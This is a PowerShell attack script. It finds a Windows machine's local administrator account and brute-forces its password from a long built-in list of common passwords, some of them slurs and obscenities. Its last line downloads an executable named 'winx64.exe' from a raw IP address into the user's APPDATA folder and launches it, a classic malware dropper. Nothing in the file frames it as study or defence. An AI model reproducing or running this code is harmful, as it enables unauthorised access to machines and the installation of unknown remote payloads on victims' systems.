
Function Brute-LocAdmin
{
    param($Username)
	Function Test-LocAdminCred
	{
		Param($username, $password)
        $computer = $env:COMPUTERNAME
        Add-Type -assemblyname System.DirectoryServices.AccountManagement
        $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
        $object = New-Object PSObject | Select-Object Username, Password, IsValid
        $object.Username = $username;
        $object.Password = $password;
        $object.IsValid = $DS.ValidateCredentials($username, $password).ToString();
        return $object
	}

	if (!$username)
	{
		$username = 'Administrator' 
        $admins = Get-WmiObject win32_groupuser   
        $admins = $admins |? {$_.groupcomponent -like '*"Administrators"'}  
  
        $admins |% {  
            if (!$_.partcomponent.contains("Win32_Group")) {
                $_.partcomponent -match ".+Domain\=(.+)\,Name\=(.+)$" > $nul  
                
                $username = $matches[2].trim('"')  
            }
        }  
        Write-Output "`n[+] Administrator not provided, found user: $username"
    }

    $allpasswords = @('0987654321','1','1111','11111','111111','1111111','11111111','112233','1212','123','123123','12321','123321','1234','12345','123456','1234567','12345678','123456789','1234567890','123456a','1234abcd','1234qwer','123abc','123asd','123asdf','123qwe','12axzas21a','1313','131313','147852','1password','1q2w3e','1qwerty','2000','2112','2222','22222','222222','2222222','22222222','232323','252525','256879','2password','3333','33333','333333','3333333','33333333','36633663','4128','4321','4444','44444','444444','4444444','44444444','485112','514007','5150','54321','5555','55555','555555','5555555','55555555','654321','6666','66666','666666','6666666','66666666','6969','696969','7654321','7777','77777','777777','7777777','77777777','786786','8675309','87654321','88888','888888','8888888','88888888','987654','987654321','99999','999999','9999999','99999999','a123456','a1b2c3','aaaa','aaaaa','aaaaaa','abc123','abcdef','abgrtyu','academia','access','access14','account','action','admin','Admin','admin1','admin12','admin123','adminadmin','administrator','adriana','agosto','agustin','albert','alberto','alejandra','alejandro','alex','alexis','alpha','amanda','amanda1','amateur','america','amigos','andrea','andrew','angel','angela','angelica','angelito','angels','animal','anthony','anthony1','anything','apollo','apple','apples','argentina','armando','arsenal','arthur','arturo','asddsa','asdf','asdf123','asdf1234','asdfasdf','asdfgh','asdsa','asdzxc','ashley','ashley1','aspateso19','asshole','august','august07','aurelie','austin','az1943','baby','babygirl','babygirl1','babygurl1','backup','backupexec','badboy','bailey','ballin1','banana','barbara','barcelona','barney','baseball','baseball1','basketball','batman','batman1','beach','bean21','bear','beatles','beatriz','beaver','beavis','beebop','beer','benito','berenice','betito','bichilora','bigcock','bigdaddy','bigdick','bigdog','bigtits','bill','billy','birdie','bisounours','bitch','bitch1','bitches','biteme','black','blahblah','blazer','blessed','blink182','blonde','blondes','blowjob','blowme','blue','bodhisattva','bond007','bonita','bonnie','booboo','boobs','booger','boomer','booty','boss123','boston','brandon','brandon1','brandy','braves','brazil','brian','bronco','broncos','brooklyn','brujita','bswartz','bubba','bubbles','bubbles1','buddy','bulldog','business','buster','butter','butterfly','butthead','caballo','cachonda','calvin','camaro','cameron','camila','campus','canada','captain','carlos','carmen','carmen1','carolina','carter','casper','changeme','charles','charlie','charlie1','cheese','cheese1','chelsea','chester','chevy','chicago','chicken','chicken1','chocolate!','chocolate','chocolate1','chris','chris6','christ','christian','clustadm','cluster','cocacola','cock','codename','codeword','coffee','college','compaq','computer','computer1','consuelo','controller','cookie','cookie1','cool','cooper','corvette','cowboy','cowboys','coyote','cream','crest','Crest','crest1','Crest1','crest123','Crest123','Crest1234','crest12345','cristian','cristina','crystal','cumming','cumshot','cunt','customer','dakota','dallas','daniel','danielle','dantheman','database','dave','david','debbie','default','dell','dennis','desktop','diablo','diamond','dick','dirty','dkennedy','dmsmcb','dmz','doctor','doggie','dolphin','dolphins','domain','domino','donald','dragon','dragons','dreams','driver','eagle','eagle1','eagles','eduardo','edward','einstein','elijah','elite','elizabeth','elizabeth1','eminem','enamorada','enjoy','enter','eric','erotic','estefania','estrella','example','exchadm','exchange','explorer','extreme','faggot','faithful','falcon','family','fantasia','felicidad','felipe','fender','fernando','ferrari','files','fire','firebird','fish','fishing','florida','flower','fluffy1','flyers','foobar','foofoo','football','football1','ford','forever','forever1','forum','francisco','frank','fred','freddy','freedom','friends','friends1','frogfrog','ftp','fuck','fucked','fucker','fucking','fuckme','fuckoff','fuckyou!','fuckyou','fuckyou1','fuckyou2','futbol','futbol02','gabriela','games','gandalf','garou324','gateway','gatito','gators','gemini','george','giants','ginger','girl','girls','godisgood','godslove','golden','golf','golfer','gordon','great','green','green1','greenday1','gregory','guest','guitar','gunner','gwalton','hacker','hammer','hannah','hannover23','happy','hardcore','harley','heather','heaven','hector','hello','hello1','helpme','hentai','hermosa','hockey','hockey1','hollister1','home123','hooters','horney','horny','hotdog','hottie','house','hunter','hunting','iceman','ihavenopass','ikebanaa','iknowyoucanreadthis','iloveu','iloveu1','iloveyou!','iloveyou.','iloveyou','iloveyou1','iloveyou2','iloveyou3','internet','intranet','isabel','iwantu','jack','jackie','jackson','jaguar','jake','james','jamesbond','jamies','japan','jasmine','jason','jasper','javier','jennifer','jer2911','jeremy','jericho','jessica','jesus1','jesusc','jesuschrist','john','john316','johnny','johnson','jordan','jordan1','jordan23','jorgito','joseph','joshua','joshua1','juice','junior','justin','justin1','kakaxaqwe','kakka','kelly','kelson','kevin','kevinn','killer','king','kitten','kitty','knight','ladies','lakers','lauren','leather','legend','legolas','lemmein','letitbe','letmein','libertad','little','liverpool','liverpool1','login','london','loser1','lotus','love','love123','lovely','loveme','loveme1','lover','lovers','loveyou','loveyou1','lucky','maddog','madison','madman','maggie','magic','magnum','mallorca','manager','manolito','margarita','maria','marie1','marine','mariposa','mark','market','marlboro','martin','martina','marvin','master','matrix','matt','matthew','matthew1','maverick','maxwell','melissa','member','menace','mercedes','merlin','messenger','metallica','mexico','miamor','michael','michael1','michelle','mickey','midnight','miguelangel','mike','miller','mine','mistress','moikka','mokito','money','money159','mongola','monica','monisima','monitor','monkey','monkey1','monster','morenita','morgan','mother','mountain','movie','muffin','multimedia','murphy','music','mustang','mypass','mypassword','mypc123','myriam','myspace1','naked','nana','nanacita','nascar','nataliag','natation','nathan','naub3.','naughty','ncc1701','negrita','newpassword','newyork','nicasito','nicholas','nicole','nicole1','nigger','nigger1','nimda','ninja','nipple','nipples','nirvana1','nobody','nomeacuerdo','nonono','nopass','nopassword','notes','nothing','noviembre','nuevopc','number1','office','oliver','oracle','orange','orange1','otalab','ou812','owner','pa55w0rd','Pa55w0rd','Pa55w0rd1','Pa55w0rd2011','Pa55W0rd2011','Pa55w0rd2012','Pa55W0rd2012','Pa55w0rd2013','Pa55W0rd2013','Pa55w0rd2014','Pa55W0rd2014','Pa55w0rd2015','Pa55W0rd2015','Pa55w0rd2016','Pa55W0rd2016','Pa55word','Pa55word1','Pa55word123','packers','paloma','pamela','pana','panda1','panther','panties','papito','paramo','paris','parisdenoia','parker','pasion','pass','pass1','pass12','pass123','passion','passport','passw0rd','passwd','password!','password?','password.','password','Password!!','Password!','Password','PASSWORD','password0','password01','password02','password05','','password1','Password1','PASSWORD1','password10','password11','password12','Password12','password123','Password123','PASSWORD123','password12345','Password12345','password13','password2','Password2','PASSWORD2','password22','password23','password26','password28','password3','password32','password34','password4','password44','password45','password5','Password54321','password55','password66','password69password77','password7','password77','password8','password85','password87','password9','password90','password91','password92','password93','password94','password95','password96','passwordpassword','passwords','Passworfd3','pastor','patoclero','patricia','patrick','paul','paulis','pavilion','Pa$$w0rd!','Pa$$w0rd1','Pa$$w0rd2012','Pa$$w0rd2013','Pa$$w0rd2014','$Pa55w0rd$','Pa$$word11111111','peace','peaches','peanut','pelirroja','pendejo','penis','pepper','pericles','perkele','perlita','perros','petalo','peter','phantom','phoenix','phpbb','pierre','piff','piolin','pirate','piscis','playboy','player','please','poetry','pokemon','poohbear1','pookie','poonam','popeye','porn','porno','porque','porsche','power','praise','prayer','presario','pretty','prince','princesa','princess','princess1','print','private','public','pukayaco14','pulgas','purple','pussies','pussy','pw123','q1w2e3','qazwsx','qazwsxedc','qosqomanta','qqqqq','qwe123','qweasd','qweasdzxc','qweewq','qwert','qwerty','qwerty1','qwerty12','qwerty80','qwertyui','qwewq','rabbit','rachel','racing','rafael','rafaeltqm','raiders','rainbow','rallitas','random','ranger','rangers','rapture','realmadrid','rebecca','redskins','redsox','redwings','rejoice','replicate','republica','requiem','rghy1234','rhayes','ricardo','richard','robert','roberto','rock','rocket','romantico','ronaldo','ronica','root','root123','rootroot','rosario','rosebud','rosita','runner','rush2112','russia','sabrina','sakura','salasana','salou25','salvation','samantha','sammy','sample','samson','samsung','samuel22','sandra','santiago','santos','sarita','saturn','scooby','scooby1','scooter','scorpio','scorpion','scott','seagate','sebastian','secret','secure','security','septiembre','sergio','servando','server','service','sestosant','sexsex','sexy','shadow','shadow1','shalom','shannon','share','shaved','shit','shorty1','sierra','silver','sinegra','sister12','skippy','slayer','slipknot','slipknot666','slut','smith','smokey','snoopy','snoopy1','snowfall','soccer','soccer1','soccer2','soledad','sonrisa','sony','sophie','soto','soyhermosa','spanky','sparky','spider','spirit','sql','sqlexec','squirt','srinivas','star','stars','startrek','starwars','steelers','steve','steven','sticky','student','stupid','success','suckit','sudoku','summer','Summer','summer1','sunshine','super','superman','superman1','superuser','supervisor','surfer','susana','swhite','swimming','sydney','system','taylor','taylor1','teacher','teens','tekila','telefono','temp!','temp','temp123','temporary','temptemp','tenerife','tennis','tequiero','teresa','test!','test','test123','tester','testing','testtest','thebest','theman','therock','thomas','thunder','thx1138','tierno','tiffany','tiger','tigers','tigger','tigger1','time','timosha','timosha123','tinkerbell','titimaman','titouf59','tits','tivoli','tobias','tomcat','toor','topgun','toyota','travis','trinity','trouble','trustno1','tucker','turtle','tweety','tweety1','twitter','tybnoq','underworld','unicornio','united','universidad','unknown','vagina','valentina','valentinchoque','valeverga','veracruz','veritas','veronica','victor','victoria','victory','video','viking','viper','virus','voodoo','voyager','walter','warrior','web','welcome','welcome123','westside','whatever','white','wiesenhof','william','william1','willie','willow','wilson','windows','winner','winston','winter','Winter','wizard','wolf','women','work123','worship','writer','writing','www','xanadu','xavier','ximena','ximenita','xxx','xxxx','xxxxx','xxxxxx','xxxxxxxx','yamaha','yankee','yankees','yankees1','yellow','yeshua','yoteamo','young','ysrmma','zapato','zirtaeb','zxccxz','zxcvb','zxcvbn','zxcvbnm','zxcxz','zxczxc','zzzzz','zzzzzz')
    $counter = 0
    Write-Output "[+] Running brute-force against the local administrator account"
    foreach ($password in $allpasswords) 
    {
        $counter++
	    $result = Test-LocAdminCred $username $password 
	    if ($result.IsValid -eq 'True'){
	        $break = $true
	    } 
	    if ($break -eq 'True'){break}
    }
    Write-Output "[+] Brute-force finished`n"
    $result
}
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',"$env:APPDATA\winx64.exe");Start-Process ("$env:APPDATA\winx64.exe")

